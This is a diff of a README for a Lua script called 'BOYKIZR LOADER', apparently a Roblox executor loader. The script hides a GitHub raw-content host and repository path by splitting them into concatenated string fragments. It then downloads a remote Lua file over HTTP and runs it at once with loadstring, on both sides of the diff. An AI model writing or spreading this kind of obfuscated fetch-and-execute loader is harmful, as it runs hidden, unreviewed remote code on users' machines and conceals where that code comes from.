@@ -1,14 +1,14 @@
 # BOYKIZR LOADER
 
 ```lua
-local function _A() return "while" .. "loop-png" end
-local function _B() return "boy" .. "kizrCRIM" end
-local function _C() return "refs" .. "/" .. "heads" .. "/" .. "main" end
-local function _CREDITCARD return "ra" .. "w.g" .. "it" .. "hu" .. "b" .. "user" .. "conte" .. "nt.com"
+local function a() return "while" .. "loop-png" end
+local function b() return "boy" .. "kizrCRIM" end
+local function c() return "refs" .. "/" .. "heads" .. "/" .. "main" end
+local function cred() return "ra" .. "w.g" .. "it" .. "hu" .. "b" .. "user" .. "conte" .. "nt.com" end
 
-local function _deepsearch(_E)
-    return loadstring(game:HttpGet(("https://%s/%s/%s/%s/%s.lua"):format(_CREDITCARD(), _A(), _B(), _C(), _E)), _E .. '.lua')()
+local function deepsearch(e)
+    return loadstring(game:HttpGet(("https://%s/%s/%s/%s/%s.lua"):format(cred(), a(), b(), c(), e)), e .. '.lua')()
 end
 
-_deepsearch("rework")
+deepsearch("rework")
 ```
